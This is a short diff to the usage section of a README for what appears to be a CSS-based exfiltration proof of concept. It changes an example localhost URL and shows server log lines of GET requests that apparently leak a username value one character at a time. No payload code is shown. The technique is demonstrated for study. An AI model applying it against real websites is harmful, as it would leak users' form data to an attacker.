@@ -24,7 +24,7 @@ There are 3 conditions
 
 ## 1 USAGE
 
-`http://127.0.0.1/css-exfilphp?username=abcab`  
+`http://127.0.0.1/css-exfilphp?username=abab`  
 Output will be:
 - [Wed Mar 30 19:58:44 2022] 127.0.0.1:52588 [404]: GET /a_ - No such file or directory
 - [Wed Mar 30 19:58:44 2022] 127.0.0.1:52589 [404]: GET /ab - No such file or directory
